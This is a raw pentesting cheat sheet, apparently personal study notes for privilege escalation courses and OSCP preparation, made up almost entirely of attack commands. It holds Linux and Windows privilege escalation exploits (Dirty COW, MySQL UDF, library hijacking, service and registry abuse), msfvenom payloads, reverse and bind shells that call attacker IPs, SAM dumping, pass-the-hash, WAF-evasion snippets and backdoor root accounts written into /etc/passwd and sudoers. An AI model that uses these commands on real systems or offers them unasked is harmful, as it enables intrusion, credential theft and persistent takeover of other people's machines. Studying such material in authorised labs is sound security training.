wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
bash linux-exploit-suggester.sh
wget https://www.exploit-db.com/download/40839
gcc -pthread 40839.c -o dcow -lcrypt
./dcow asd
su firefart
mv /tmp/passwd.bak /etc/passwd

		##mysql privsec
bash lse
mysql -u root
>select load_file ("/etc/shadow");
>set @asd = LOAD_FILE("/etc/shadow");
>select @asd;
>select @asd into outfile "/tmp/shadow.bak";

		##mysql UDF raptor os command
mysql --version
https://www.exploit-db.com/exploits/1518
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root
>use mysql;
>create table foo(line blob);
>insert into foo values(load_file('/home/user/raptor_udf2.so'));
>select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
>create function do_system returns integer soname 'raptor_udf2.so';
>select * from mysql.func;
>select do_system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash");
>exit
/tmp/rootbash -p

		##get user hash mysql
strings /var/lib/mysql/mysql/user.MYD

		##root login ssh
grep PermitRootLogin /etc/ssh/sshd_config

		##apache2 sudo
sudo apache2 -f /etc/shadow

		##using LD_PRELOAD
https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

		##LD_LIBRARY_PATH privsc
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p"); }

which apache2
ldd /usr/sbin/apache2
gcc -o libcrypt.so.1 -shared -fPIC library_path.c
sudo LD_LIBRARY_PATH=. apache2

		##cronjob writable job
cat /etc/crontab
which scipt.sh
ls -l /home/user/script.sh		
		
		##cronjob writable directory
cat /etc/crontab
nano /home/user/script.sh
/home/user/rootbash -p

		##cronjob wildcard *
cat /etc/crontab
		* * * * * root /usr/local/bin/compress.sh
cat /usr/local/bin/conpress.sh
		cd /home/user; tar czf /tmp/backup.tar.gz *
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=rshell.sh

		##SUID exim
./lse
exim --version
	exim 4.84
searchsploit exim 4.84
searchsploit exim 4.8
searchsploit -m 39535
bash 39545.sh
	/bin/sh^M: bad interpreter
sed -i -e "s/^M//" 39545.sh
bash 39545.sh		
		
		##Shared Object Injection
bash lse
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
	open("/home/user/.config/libcalc.so", rdonly)(No such file or directory)
ls -l /home/user/.config/
nano /home/user/.config/libcalc.c
	#include <stdio.h>
	#include <stdlib.h>
	static void hijack() __attribute__((constructor));
	void hijack() {
	setuid(0);
	system("/bin/bash -p"); }
gcc -shared -fPIC -o libcalc.so libcalc.c
/usr/local/bin/suid-so

		##PATH environment
/usr/local/bin/suid-env
	starting apache2
strings /usr/local/bin/suid-env
	service apache2 start
strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service
	service apache2 start
nano service.c
	int main() {setuid(0); system("/bin/bash -p"); }
gcc -o service service.c
PATH=.:$PATH
/usr/local/bin/suid-env

		##abuse shell bash < 4.2-048
/usr/local/sbin/suid-env2
	starting apache2
strings /usr/local/bin/suid-env2
	/usr/sbin/service apache2 start
strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
	/usr/sbin/service apache2 start
/bin/sh --version
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

		##abuse bash SHELLOPTS PS4 xtrace bash < 4.4
/usr/local/sbin/suid-env2
strings /usr/local/bin/suid-env2
strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
/bin/sh --version
env -i SHELLOPTS=xtrace PS4='<test>' /usr/local/bin/suid-env
env -i SHELLOPTS=xtrace PS4='$(whoami)' /usr/local/bin/suid-env
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash)' /usr/local/bin/suid-env
/tmp/rootbash -p

		##NFS nfs no_root_squash
cat /etc/exports
showmount -e 10.1.1.73
mkdir nfs
mount -o rw,vers=2 10.1.1.73:/tmp nfs/
cp rootbash nfs/rootbash
chmod +xs nfs/rootbash
ls -l /tmp
/tmp/rootbash -p




Windows Priviledge Escalation Course
====================================
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.1.1.5 LPORT=5555 -f exe -o reverse.exe
curl 10.1.1.5/reverse.exe -o reverse.exe
.\reverse.exe
rlwarp nc -lvp 5555
powershell -exec bypass

	##Kernel Exploit Windows
systeminfo > systeminfo.txt
	Microsoft Windows 7 Professional
	6.1.701 Service Pack 1 Build 7601
python2.7 -m pip install xlrd==1.2.0
python windows-exploit-suggester.py -d 2020-12-18-mssb.xls -i systeminfo.txt
	windows 7 CVE-2018-8120 kernel exploit privsc
x64.exe whoami
.\x64.exe reverse.exe
	#kernel exploit cheatseet
	#https://kakyouim.hatenablog.com/entry/2020/05/27/010807

	##service SERVICE_CHANGE_CONFIG exploit
	##insecure service permission
.\winpeas.exe quite servicesinfo
curl 10.1.1.5/accesschk.exe -o accesschk.exe
.\accesschk.exe /accepteula -uwcqv user daclsvc
	SERVICE_CHANGE_CONFIG
	SERVICE_START
	SERVICE_STOP
	#check status service windows
sc query daclsvc
sc.exe qc daclsvc
sc.exe query daclsvc
sc.exe config daclsvc binpath= "C:\PrivEsc\reverse53.exe"
sc.exe qc daclsvc
nc -lvp 53
net start daclsvc

	##exploit unquoted path services
.\winpeas.exe quite servicesinfo
	Unquoted Path Service
	no quotes and space detected
.\accesschk.exe /accepteula -ucqv unquotedsvc
	SERVICE_START
	SERVICE_STOP
sc.exe qc daclsvc
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
	RM BUILDIN\Users
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\Common Files"
copy reverse53.exe "C:\Program Files\Unquoted Path Service\Common.exe"
sc.exe query unquotedsvc
nc -lvp 53
net start unquotedsvc

	##exploit weak registry permission
.\winpeas.exe
	modify any service registry
Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
	RW NT AYTHORITY\INTERACTIVE
.\accesschk.exe /accepteula -ucqv user regsvc
	SERVICE_START
	SERVICE_STOP
reg query HKLM\SYSTEM\CurrentControlSet\Services\regsvc
	ImagePath REG_EXPAND_SZ "C:\Program Files\insecureregistryservice.exe
	ObjectName REG_SZ LocalSystem
reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v imagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse53.exe /f
nc -lvp 53
net start regsvc

	##insecure service excutable FILE_ALL_ACCESS
.\winpeas.exe
	filepremsvc(File Permissions Service)
.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
	RW Everyone FILE_ALL_ACCESS
.\accesschk.exe /accepteula -uvqc filepermsvc
	SERVICE_START
	SERVICE_STOP
copy "C:\Program Files\..\filepermservice.exe" C:\Temp
copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\...\filepermservice.exe"
nc -lvp 53
net start filepermsvc
copy C:\Temp\filepermservice.exe "C:\Program Files\..\filepermservice.exe"

	##DLL search
echo %path%
accesschk.exe -dqv "C:\Python27"
calc "C:\Python27"

	##DLL HIjacking
.\accesschk.exe /accepteula -uvqc user dllsvc
	SERVICE_START
	SERVICE_STOP
sc.exe qc dllsvc
open procmon windows
clear and filter dllhijackservice.exe
	hijackme.dll NAME NOT FOUND
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.1.1.5 LPORT=53 -f dll -o hijackme.dll
copy hijackme.dll C:\Temp
nc -lvp 53
net start dllsvc

	##registry Autorun windows
.\winpeas.exe
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
	FILE_ALL_ACCESS
copy "C:\Program Files\Autorun Program\program.exe" autorun.exe
copy /Y reverse53.exe "C:\Program Files\Autorun Program\program.exe"
nc -lvp 53
reboot from admin / update windows and reboot


	##Always Install Elevated msi
.\winpeas.exe
	AlwaysInstallElevated set to 1 in HKLM
	AlwaysInstallElevated set to 1 in HKCU
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.1.1.5 LPORT=53 -f msi -o reverse53.msi
msiexec /quiet /qn /i reverse53.msi

	##password registry
.\winpeas.exe
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query HKCU /f password /t REG_SZ /s
winexe -U 'admin%password123' //10.10.122.201 cmd.exe


	##saved password
cmdkey /list
runas /savecred /user:admin C:\PrivEsc\reverse53.exe


	##search password file
dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt

	## SAM SYSTEM windows
C:\Windows\System32\Config
C:\Windows\Repair
C:\Windows\System32\config\RegBack
python /usr/share/doc/python3-impacket/examples/smbserver.py asd .
copy C:\Windows\repair\SAM 10.1.1.5\asd\
copy C:\Windows\repair\SYSTEM 10.1.1.5\asd\
git clone https://github.com/Neohapsis/creddump7.git
sudo pip3 install pycrypto
python3 pwdump.py SYSTEM SAM
	admin:500:31d6cfkajsbfk1397ghro28y983:oisoidj0981y3hru
	user:code:LM hash:NTLM hash
	if user has NTLM has start with 31d6c maybe set with no password or disabled
samdump2 SYSTEM SAM
hashcat -m 1000 --force a9vqoiqhf9hq80as8hfoif0da /home/rockyou.txt
hashcat -m 1000 hash.txt /home/rockyou.txt
	#pass the hash
evil-winrm -i 10.1.1.75 -u admin -H a9vqoiqhf9hq862340as8hfoif0da
pth-winexe -U 'admin%add3liof8auweoi18:a9vqoiqhf9hq862340as8hfoif0da' //10.1.1.75 cmd.exe
pth-winexe --system -U 'admin%add3liof8auweoi18:a9vqoiqhf9hq862340as8hfoif0da' //10.1.1.75 cmd.exe

	##task schedule
schtasks /query /fo LIST /v
PS> GET-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
type C:\DevTools\CleanUp.ps1
accesschk.exe /accepteula -quv user C:\DevTools\CleanUp.ps1
	FILE_WRITE_DATA
copy C:\DevTools\CleanUp.ps1 C:\Temp\
echo "C:\PrivEsc\reverse53.exe" >> C:\DevTools\CleanUp.ps1
nc -lvp 53

	##insecure GUI application
tasklist /V | findstr mspaint.exe
tasklist /V | findstr admin
click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe
file://c:/windows/system32/cmd.exe
Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

	##Citrix environment
tasklist /V | findstr mspaint.exe
	running as admin
mspain > open file > file://C:/windows/system32/cmd.exe
nc -lvp 5555
mspain > open file > file://c:/windows/privesc/reverse.exe

	##startup application
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
	RW BUILDIN/Users
type CreateShotcut.vbs
	set oWS = WScript.CreateObject("WScript.Shell")
	sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
	set oLink = oWS.CreateShortCut(SLinkFile)
	oLink.TargetPath = "C:\PrivEsc\reverse222.exe"
	oLink.Save
cscript CreateShortcut.vbs
signoff > login as admin
login rdp as admin

	##installed application
.\Seatbelt.exe all
	Non Microsoft Process
.\winpeas.exe
	process line
find on exploit DB

	#password mining browser
msfconsole
use auxiliary/server/capture/http_basic
set uripath x set svchost 10.4.11.80
run
http://10.4.11.80/x with IExplorer
tskmanager -> right click -> create dumpfile
C:\Users\user\AppData\Local\Temp\iexplore.DMP
cat iexplore.DMP | grep "Authorization: Basic"


	##token impersonate rogue potato
whoami /priv
	SeImpersonatePrivilege
	SeAssignPrimaryTokenPrivilege
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.147.113:9999
C:\PrivEsc\RoguePotato.exe -r 10.4.11.80 -e "C:\PrivEsc\rev.exe" -l 9999
nc -lvp 4242
	##token impoersonate printspoofer
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\rev.exe" -i
nc -lvp 4242
	
	##Potato Privesc
	#https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
	#Hot Potato MS16-075
systeminfo
	Microsoft Windows & Profesional
	6.1.7601 Service Pack 1 Build 701
.\potato.exe -ip 10.1.1.75 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
powershell.exe -nop -ep bypass
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
Invoke-Tater -Trigger 1 -Command "whoami > asd.txt"
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
net localgroup administrators



LFI Cheatseet


Evading WAF
===================================
system(base64_decode($_GET['c']))
http://website/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php


Root exec()
===================================
usermod -a -G admin user1				##in case u have user1 passwd
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
/tmp/rootbash -p
echo "rooot::0:0:root:/root:/bin/bash" >> /etc/passwd
echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash" >> /etc/passwd
chown root:root /bin/sh ; chmod 4777 /bin/sh
/bin/bash -c 'bash -i >& /dev/tcp/10.1.1.5/4321 0>&1'
echo "www-data ALL= (root) NOPASSWD: /usr/bin/sudo " >> /etc/sudoers
sudo -u root sudo su

===========================================================================

##no redirect with curl -v
##program bin exploit:https://gtfobins.github.io

##jquery vulner file upload
jquery-file-upload/server/php/
curl -F "files=@hex.php" http://local.linuxsec.org/labs/jQuery-File-Upload-9.22.0/server/php/ -v
    http://localhost##labs##jQuery-File-Upload-9.22.0##server##php##files##hex.php
	
cat /opt/LinEnum/LinEnum.sh | base64 -w 0 | xclip -selection primary
##paste in target with middle mouse click
base64 -d linenum.b64 > linenum.sh

curl -X OPTIONS -v http://192.168.126.129/test/
fuzzing github https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
https://www.exploit-db.com/docs/english/47032-buffer-overflows,-c-programming,-nsa-ghidra-and-more.pdf

##ubuntu network troubleshoot
cat /etc/*-release
systemctl list-unit-files | grep -i network
ethtool eth0
nano /etc/network/interfaces
	auto eth0
	iface eth0 inet dhcp
ifconfig eth0 up
dmesg | grep -i eth
dhclient eth1

##centos network troubleshoot
cat /etc/*-release
ip a
cd /etc/sysconfig/network-script/
ls -laht
nano ifcfg-eth0
	DECIVE=eth0
	TYPE=Ethernet
	BOOTPROTO=dhcp
	ONBOOT=yes
	DHCP=yes
/etc/init.d/network restart
ifdown eth0
ifcup eth0


##disable ASLR
sudo sysctl -w kernel.randomize_va_space=0
    0 = Disablabed
    1 = Conservative Randomization
    2 = Full Randomization
	
##quick nmap
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.182 | grep ^[0-9] | cut -d '/'-f 1 | tr '\n' ',' | sed s/,$//)nmap -p$ports-Pn-sC-sV10.10.10.182
	
grep -o x /tmp/etcpasswd | wc -l
			##count exact word
ps -xaf		
		##windows nopass
https://0xdf.gitlab.io/2020/09/17/zerologon-owning-htb-machines-with-cve-2020-1472.html

		##image enumerate
binwalk -W	
		##modify time file
touch -a -m -t 202001011240.05 file.txt
[[CC]YY]MMDDhhmm[.ss] time format

		##ssl bind shells:
Target: ncat -nvlp 4321 -e {/bin/bash | cmd.exe} --ssl
Attacker: ncat -nv 101.1.32 4321 --ssl

		##ssl reverse shells:
Target: ncat -nv 10.1.1.5 4321 -e {/bin/bash | cmd.exe} --ssl
Attacker: ncat -nvlp 4321 --ssl

		##curl put response
http response 201 created

echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash

		##tor network
torsocks curl ipv4.icanhazip.com
		
		##change default python
update-alternatives --config python
 
		##open image cmd
eog image.jpg

		##disk full
df -h
df -i
find / -type f -size +500M -exec ls -lht {}\;
find / -xdev -nam core -ls -o -path "/lib*" -prune
apt-get install ncdu
ncdu -x /
apt-get autoclean

		##last updated file
find / -mtime -1 -ls

		##OSCP
https://community.infosecinstitute.com/discussion/110760/oscp-jollyfrogs-tale


